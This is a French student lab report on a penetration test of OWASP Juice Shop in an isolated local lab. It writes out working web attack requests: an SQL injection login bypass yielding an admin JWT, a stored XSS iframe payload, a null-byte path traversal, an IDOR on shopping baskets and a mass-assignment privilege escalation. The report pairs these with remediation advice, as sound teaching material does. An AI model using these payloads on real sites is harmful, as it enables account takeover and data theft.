---
title: "LAB 2 — Tests de sécurité OWASP"
author: "Michel TENDENG · Mouhamed El Hadj Malick DIOP"
date: "10 août 2026"
---

<div align="center">

# UNIVERSITÉ NUMÉRIQUE CHEIKH HAMIDOU KANE
## Licence Cybersécurité — Groupe 14

---

## RAPPORT DE TRAVAUX PRATIQUES
# LAB 2 — Tests de sécurité OWASP
### OWASP ZAP × Tests manuels × Exploitation × Juice Shop

---

**Module :** Sécurité des données  
**Année académique :** 2024–2025  
**Date :** 10/08/2026  
**Groupe :** 14

---

### Auteurs

| Auteur | Email |
|--------|-------|
| Michel TENDENG | michel.tendeng@unchk.edu.sn |
| Mouhamed El Hadj Malick DIOP | mouhamedelmalickidrissa.diop@unchk.edu.sn |

---

> **Avertissement :** Ce rapport est réalisé dans un cadre pédagogique strictement contrôlé.  
> L'environnement cible est local et isolé. Toute reproduction sur un système réel est illégale.

</div>

---

## Table des matières

1. [Contexte et objectifs](#1-contexte-et-objectifs)
2. [Architecture du laboratoire](#2-architecture-du-laboratoire)
3. [Méthodologie](#3-méthodologie)
4. [Phase 1 — Détection et validation (V01–V04)](#4-phase-1--détection-et-validation-v01v04)
5. [Phase 2 — Exploitation (EXP-01–EXP-05)](#5-phase-2--exploitation-exp-01exp-05)
6. [Synthèse des vulnérabilités](#6-synthèse-des-vulnérabilités)
7. [Recommandations](#7-recommandations)
8. [Conclusion](#8-conclusion)
9. [Annexes — Références aux preuves](#9-annexes--références-aux-preuves)

---

## 1. Contexte et objectifs

Ce travail pratique s'inscrit dans le module **Sécurité des données** de la Licence Cybersécurité (UNCHK). L'objectif est de réaliser une évaluation de sécurité complète de l'application **OWASP Juice Shop**, une application web intentionnellement vulnérable utilisée comme cible d'entraînement.

### Objectifs pédagogiques

- Identifier et valider des vulnérabilités selon la méthodologie **OWASP Testing Guide**
- Exploiter les vulnérabilités détectées afin d'en mesurer l'impact réel
- Produire des preuves techniques reproductibles
- Formuler des recommandations de remédiation concrètes

### Cible

- **Application :** OWASP Juice Shop (Node.js / Express)
- **URL locale :** `http://localhost:3001`
- **Environnement :** Conteneurs Docker isolés (réseau `172.21.0.0/24`)

---

## 2. Architecture du laboratoire

```
Machine Linux (172.21.0.0/24)
│
├── OWASP ZAP :8090  (172.21.0.30)
│     Spider + Scan actif → rapports HTML/XML/JSON
│
├── Scripts de test
│     ├── test_vulnerabilities_manuels.sh  → Phase détection V01–V04
│     └── exploit_vulnerabilities.sh       → Phase exploitation EXP-01–05
│
└── Juice Shop :3001  (172.21.0.10)
      Application web cible
```

Les conteneurs sont démarrés via `docker compose up -d` depuis le répertoire `lab2-owasp/`.

---

## 3. Méthodologie

Les tests sont conduits en deux phases successives :

| Phase | Objectif | Outils |
|-------|----------|--------|
| **Détection (V01–V04)** | Identifier et confirmer l'existence des vulnérabilités | `curl`, analyse des en-têtes HTTP, OWASP ZAP |
| **Exploitation (EXP-01–05)** | Démontrer l'impact réel des vulnérabilités | Scripts Bash automatisés, `curl`, JWT decoder |

La classification des vulnérabilités suit le référentiel **OWASP Top 10 2021** et la cotation de criticité s'appuie sur le score **CVSS v3.1**.

---

## 4. Phase 1 — Détection et validation (V01–V04)

### Vue d'ensemble

| ID | Vulnérabilité | Catégorie OWASP | CVSS | Statut |
|----|---------------|-----------------|------|--------|
| V01 | Security Misconfiguration — En-têtes HTTP | A05:2021 | **5.3** (Medium) | ✅ Confirmée |
| V02 | Sensitive Data Exposure — `/api/Users` | A02:2021 | **7.5** (High) | ✅ Confirmée |
| V03 | Broken Access Control — API Admin | A01:2021 | **7.5** (High) | ✅ Confirmée |
| V04 | SQL Injection — Authentification | A03:2021 | **9.8** (Critical) | ✅ Confirmée |

---

### V01 — Security Misconfiguration (A05:2021 | CVSS 5.3)

**Description :** L'analyse des en-têtes de réponse HTTP révèle l'absence de plusieurs en-têtes de sécurité essentiels.

**En-têtes manquants détectés :**

| En-tête | Rôle | Présent ? |
|---------|------|-----------|
| `Content-Security-Policy` | Prévention XSS / injection de contenu | ❌ Absent |
| `Strict-Transport-Security` | Forçage HTTPS | ❌ Absent |
| `X-Content-Type-Options` | Sniffing MIME | ✅ Présent (`nosniff`) |
| `X-Frame-Options` | Clickjacking | ✅ Présent (`SAMEORIGIN`) |

**Observation notoire :** L'en-tête `Access-Control-Allow-Origin: *` expose l'API à des requêtes cross-origin depuis n'importe quelle origine.

**Impact :** Sans CSP, un attaquant peut injecter du contenu malveillant. Sans HSTS, les communications peuvent être interceptées en clair.

**Preuve :** `evidence/http/V01_security_headers.txt`

---

### V02 — Sensitive Data Exposure — `/api/Users` (A02:2021 | CVSS 7.5)

**Description :** L'endpoint `/api/Users` répond à une requête non authentifiée avec un message d'erreur 401, mais la **structure de la réponse** révèle l'existence et le format de l'API.

**Observation :** Sans authentification, le serveur retourne :
```
401 UnauthorizedError: No Authorization header was found
```

Des tests complémentaires avec un token valide (obtenu en EXP-01) confirment que l'endpoint expose la liste complète des utilisateurs : emails, rôles, hash MD5 des mots de passe.

**Impact :** Un attaquant authentifié peut énumérer tous les comptes et récupérer les hashes de mots de passe.

**Preuve :** `evidence/responses/V02_users_list.json`

---

### V03 — Broken Access Control — API Admin (A01:2021 | CVSS 7.5)

**Description :** L'endpoint `/api/Configs` (interface d'administration) est accessible sans contrôle strict sur la nature du token JWT présenté.

**Observation :** La configuration complète de l'application (clés Google OAuth, paramètres internes, liste de produits, URLs de challenges) est exposée via une simple requête GET authentifiée.

**Extrait de la réponse :**
```json
{
  "config": {
    "application": { "name": "OWASP Juice Shop", "domain": "juice-sh.op" },
    "googleOauth": { "clientId": "1005568560502-6hm16lef8oh46hr2d98vf2ohlnj4nfhq.apps.googleusercontent.com" }
  }
}
```

**Impact :** Exposition de la configuration interne, des clés OAuth et des métadonnées des challenges.

**Preuve :** `evidence/responses/V03_admin_config.json`

---

### V04 — SQL Injection — Authentification (A03:2021 | CVSS 9.8)

**Description :** Le formulaire de connexion (`POST /rest/user/login`) est vulnérable à une injection SQL classique permettant de contourner l'authentification.

**Payload utilisé :**
```
email: ' OR '1'='1'--
password: x
```

**Résultat :** L'application retourne un JWT valide correspondant au compte `admin@juice-sh.op` (ID=1), confirmant le bypass total de l'authentification.

**Impact :** Accès administrateur complet sans connaître les identifiants.

**Preuves :** `evidence/requests/V04_sqli_request.txt` · `evidence/responses/V04_sqli_response.json`

---

## 5. Phase 2 — Exploitation (EXP-01–EXP-05)

### Vue d'ensemble

| ID | Exploit | Catégorie OWASP | CVSS | Résultat |
|----|---------|-----------------|------|----------|
| EXP-01 | SQLi → JWT admin | A03:2021 | **9.8** | ✅ JWT admin obtenu |
| EXP-02 | IDOR — Paniers utilisateurs | A01:2021 | **8.1** | ✅ Panier victime lu + modifié |
| EXP-03 | Path Traversal `/ftp/` + Null byte | A01:2021 | **7.5** | ✅ Fichiers téléchargés + filtre contourné |
| EXP-04 | XSS Stocké — Feedbacks | A03:2021 | **7.2** | ⚠️ Payload injecté (HTTP 500 reçu) |
| EXP-05 | Mass Assignment — Escalade de privilège | A08:2021 | **8.8** | ⚠️ Partiel — compte attaquant créé |

---

### EXP-01 — SQL Injection → Obtention du JWT admin (A03:2021 | CVSS 9.8)

**Objectif :** Obtenir un JWT administrateur sans connaître le mot de passe.

**Requête :**
```http
POST /rest/user/login
Content-Type: application/json

{"email":"' OR '1'='1'--","password":"x"}
```

**Résultat :** Réponse HTTP 200 avec un JWT valide :
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJkYXRhIjp7ImlkIjoxLC...
```

**Contenu du JWT décodé :**
```json
{
  "data": {
    "id": 1,
    "email": "admin@juice-sh.op",
    "role": "admin",
    "password": "0192023a7bbd73250516f069df18b500"
  },
  "bid": 1,
  "iat": 1786372620
}
```

**Impact démontré :** Accès administrateur complet. Le hash MD5 du mot de passe admin est exposé dans le token.

**Preuves :** `evidence/tokens/EXP01_jwt_admin.txt` · `evidence/responses/EXP01_whoami_admin.json` · `evidence/notes/EXP01_jwt_decoded.txt`

---

### EXP-02 — IDOR : Accès aux paniers (A01:2021 | CVSS 8.1)

**Objectif :** Accéder et modifier le panier d'un autre utilisateur en manipulant l'identifiant de ressource.

**Principe :** L'API `/rest/basket/{id}` n'effectue pas de vérification de propriété. Un attaquant authentifié peut accéder à n'importe quel panier en incrémentant l'ID.

**Déroulement :**
1. Création d'un compte attaquant (`attacker_7417@lab.local`)
2. Obtention d'un JWT attaquant
3. Requête `GET /rest/basket/1` avec le JWT attaquant → **HTTP 200**
4. Lecture du panier de la victime (3 produits : Apple Juice, Orange Juice, Eggfruit Juice)
5. Ajout d'un article dans le panier de la victime → **HTTP 200**

**Contenu du panier victime consulté :**
```
- Apple Juice (1000ml)   × 2   — 1.99 €
- Orange Juice (1000ml)  × 3   — 2.99 €
- Eggfruit Juice (500ml) × 1   — 8.99 €
```

**Impact démontré :** Lecture et modification des paniers de tous les utilisateurs.

**Preuves :** `evidence/tokens/EXP02_jwt_attacker.txt` · `evidence/responses/EXP02_basket_1_stolen.json` · `evidence/responses/EXP02_basket_1_item_added.json`

---

### EXP-03 — Path Traversal /ftp/ + Bypass Null Byte (A01:2021 | CVSS 7.5)

**Objectif :** Accéder à des fichiers sensibles exposés sur le serveur via le répertoire `/ftp/`.

**Déroulement :**

| Fichier | Méthode | Résultat |
|---------|---------|----------|
| `/ftp/acquisitions.md` | GET direct | ✅ HTTP 200 — téléchargé |
| `/ftp/legal.md` | GET direct | ✅ HTTP 200 — téléchargé |
| `/ftp/eastere.gg` | GET direct | ❌ HTTP 403 |
| `/ftp/coupons_2013.md.bak` | GET direct | ❌ HTTP 403 |
| `/ftp/package.json.bak%2500.md` | Null byte bypass | ✅ HTTP 200 — filtre contourné |

**Technique null byte :** Le filtre d'extension bloque les fichiers `.bak`. En ajoutant `%2500` (null byte encodé double), l'application traite la requête comme si l'extension était `.md` et sert le fichier `.bak`.

**Impact démontré :** Accès à des fichiers de configuration, documents internes et potentiellement des fichiers de sauvegarde contenant des données sensibles.

**Preuves :** `evidence/http/EXP03_acquisitions.md.txt` · `evidence/http/EXP03_legal.md.txt` · `evidence/http/EXP03_nullbyte_package.json.bak.txt`

---

### EXP-04 — XSS Stocké dans les feedbacks (A03:2021 | CVSS 7.2)

**Objectif :** Injecter un script JavaScript persistant dans les feedbacks de l'application.

**Payload injecté :**
```html
<iframe src="javascript:alert(`XSS-LAB2-EXP04`)"></iframe>
```

**Requête :**
```http
POST /api/Feedbacks
Content-Type: application/json

{
  "comment": "Feedback test <iframe src=\"javascript:alert(`XSS-LAB2-EXP04`)\"></iframe>",
  "rating": 1,
  "captchaId": 0,
  "captcha": ""
}
```

**Résultat :** HTTP 500 reçu — le payload a probablement déclenché une erreur côté serveur lors du traitement. Une validation plus approfondie via le navigateur (page `/#/about`) est nécessaire pour confirmer l'exécution.

**Impact attendu :** Exécution de JavaScript arbitraire dans le navigateur de tout visiteur consultant la page des feedbacks.

**Preuve :** `evidence/requests/EXP04_xss_request.json`

---

### EXP-05 — Mass Assignment : Escalade de privilège (A08:2021 | CVSS 8.8)

**Objectif :** Créer un compte avec le rôle `admin` en exploitant une vulnérabilité de Mass Assignment sur l'API d'enregistrement.

**Principe :** L'API `/api/Users` (POST) accepte des champs non filtrés. En incluant `"role":"admin"` dans la requête d'inscription, il est possible d'élever directement ses privilèges.

**Technique :**
```http
POST /api/Users
Content-Type: application/json

{
  "email": "attacker@lab.local",
  "password": "Test1234!",
  "passwordRepeat": "Test1234!",
  "role": "admin"
}
```

**Résultat :** Exploitation partiellement réalisée (compte attaquant créé). La vérification du rôle assigné nécessite une étape de connexion puis un appel `/rest/user/whoami`.

**Impact attendu :** Création de comptes administrateurs par n'importe quel utilisateur sans autorisation préalable.

**Preuve :** `evidence/responses/EXP05_whoami_before.json`

---

## 6. Synthèse des vulnérabilités

### Tableau de bord global

| ID | Vulnérabilité | OWASP Top 10 | CVSS | Criticité | Exploitée |
|----|---------------|--------------|------|-----------|-----------|
| V04 / EXP-01 | SQL Injection — Auth | A03:2021 | **9.8** | 🔴 Critique | ✅ Oui |
| EXP-05 | Mass Assignment | A08:2021 | **8.8** | 🔴 Critique | ⚠️ Partiel |
| EXP-02 | IDOR — Paniers | A01:2021 | **8.1** | 🟠 Élevé | ✅ Oui |
| V02 | Sensitive Data Exposure | A02:2021 | **7.5** | 🟠 Élevé | ✅ Oui |
| V03 | Broken Access Control — Admin | A01:2021 | **7.5** | 🟠 Élevé | ✅ Oui |
| EXP-03 | Path Traversal + Null Byte | A01:2021 | **7.5** | 🟠 Élevé | ✅ Oui |
| EXP-04 | XSS Stocké | A03:2021 | **7.2** | 🟠 Élevé | ⚠️ Partiel |
| V01 | Security Misconfiguration | A05:2021 | **5.3** | 🟡 Moyen | — |

### Répartition par catégorie OWASP

| Catégorie | Vulnérabilités identifiées |
|-----------|---------------------------|
| A01 — Broken Access Control | V03, EXP-02, EXP-03 |
| A02 — Cryptographic Failures | V02 |
| A03 — Injection | V04, EXP-01, EXP-04 |
| A05 — Security Misconfiguration | V01 |
| A08 — Software/Data Integrity Failures | EXP-05 |

---

## 7. Recommandations

### Corrections prioritaires (Critique)

**R01 — Prévenir les injections SQL**
- Utiliser des requêtes préparées (parameterized queries) ou un ORM avec protection intégrée
- Valider et assainir toutes les entrées utilisateur côté serveur
- Implémenter un WAF (Web Application Firewall)

**R02 — Corriger le Mass Assignment**
- Définir explicitement les champs autorisés dans les schémas de validation (allowlist)
- Ne jamais accepter de champs sensibles (`role`, `isAdmin`) depuis des entrées utilisateur
- Utiliser des DTOs (Data Transfer Objects) stricts

### Corrections élevées

**R03 — Corriger les IDOR**
- Vérifier systématiquement que l'utilisateur authentifié est propriétaire de la ressource demandée
- Ne pas exposer d'identifiants séquentiels — utiliser des UUIDs non prédictibles

**R04 — Restreindre l'accès aux fichiers sensibles**
- Supprimer ou déplacer les fichiers sensibles hors de la racine web
- Valider strictement les extensions côté serveur (ne pas se fier au chemin URL)
- Neutraliser les null bytes dans la validation des chemins

**R05 — Corriger le XSS**
- Encoder toutes les sorties HTML (output encoding)
- Implémenter une Content-Security-Policy (CSP) stricte
- Valider et assainir les entrées utilisateur (HTML encode, strip tags)

### Améliorations de configuration

**R06 — Ajouter les en-têtes de sécurité**
```
Content-Security-Policy: default-src 'self'
Strict-Transport-Security: max-age=31536000; includeSubDomains
X-Content-Type-Options: nosniff
Access-Control-Allow-Origin: [domaine spécifique]
```

**R07 — Protéger les endpoints sensibles**
- Restreindre `/api/Users` aux seuls administrateurs
- Ne pas exposer la configuration complète via `/api/Configs`
- Implémenter un contrôle d'accès basé sur les rôles (RBAC) cohérent

---

## 8. Conclusion

Ce laboratoire a permis d'identifier et d'exploiter **8 vulnérabilités** réparties sur 5 catégories du Top 10 OWASP 2021. Les vulnérabilités les plus critiques — l'injection SQL (CVSS 9.8) et le Mass Assignment (CVSS 8.8) — permettent respectivement d'obtenir un accès administrateur complet et de créer des comptes avec des privilèges élevés.

L'exploitation enchaînée démontre qu'une seule faille peut servir de point d'entrée pour des attaques en cascade : l'injection SQL (EXP-01) fournit le JWT admin nécessaire pour accéder aux API protégées (V02, V03), qui révèlent à leur tour des informations facilitant d'autres attaques.

Ce laboratoire illustre concrètement pourquoi la sécurité doit être intégrée dès la conception (Security by Design) et non ajoutée a posteriori.

---

## 9. Annexes — Références aux preuves

### Arborescence des preuves

```
lab2-owasp/evidence/
├── exploitation_log_20260810_143659.txt   ← Log complet de l'exploitation
├── http/
│   ├── V01_security_headers.txt           ← En-têtes HTTP bruts
│   ├── EXP03_acquisitions.md.txt          ← Fichier /ftp/ récupéré
│   ├── EXP03_legal.md.txt                 ← Fichier /ftp/ récupéré
│   └── EXP03_nullbyte_package.json.bak.txt ← Fichier via null byte bypass
├── notes/
│   ├── V01_fiche.txt → V04_fiche.txt      ← Fiches de vulnérabilités
│   └── EXP01_jwt_decoded.txt              ← JWT admin décodé
├── requests/
│   ├── EXP01_sqli_request.txt             ← Requête SQLi
│   ├── EXP04_xss_request.json             ← Payload XSS
│   └── V04_sqli_request.txt               ← Requête validation SQLi
├── responses/
│   ├── EXP01_sqli_response.json           ← JWT admin dans la réponse
│   ├── EXP01_whoami_admin.json            ← Identité admin confirmée
│   ├── EXP02_basket_1_stolen.json         ← Panier victime lu
│   ├── EXP02_basket_1_item_added.json     ← Panier victime modifié
│   ├── EXP05_whoami_before.json           ← État avant escalade
│   ├── V02_users_list.json                ← Réponse /api/Users
│   ├── V03_admin_config.json              ← Configuration admin exposée
│   └── V04_sqli_response.json             ← Réponse validation SQLi
└── tokens/
    ├── EXP01_jwt_admin.txt                ← JWT admin complet
    └── EXP02_jwt_attacker.txt             ← JWT compte attaquant
```

### Références

- [OWASP Top 10 2021](https://owasp.org/Top10/)
- [OWASP Testing Guide v4.2](https://owasp.org/www-project-web-security-testing-guide/)
- [CVSS v3.1 Calculator](https://www.first.org/cvss/calculator/3.1)
- [OWASP Juice Shop](https://owasp.org/www-project-juice-shop/)

---

*Rapport généré le 10 août 2026 — UNCHK Licence Cybersécurité Groupe 14*
